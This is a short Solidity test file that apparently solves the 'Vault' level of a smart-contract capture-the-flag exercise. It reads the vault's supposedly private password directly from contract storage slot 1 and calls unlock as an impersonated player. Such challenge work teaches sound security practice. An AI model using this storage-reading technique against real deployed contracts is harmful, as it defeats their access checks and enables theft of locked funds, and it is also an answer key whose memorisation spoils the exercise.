// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/08_Vault.sol";

contract TestVault is Test {
    address public player = address(0xbad);
    Vault public instance;

    function setUp() public {
        instance = new Vault(bytes32(vm.randomUint()));
        vm.deal(player, 0.001 ether);
    }

    function testSolution() public {
        vm.startPrank(player);

        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));
        instance.unlock(password);

        assertFalse(instance.locked());

        vm.stopPrank();
    }
}
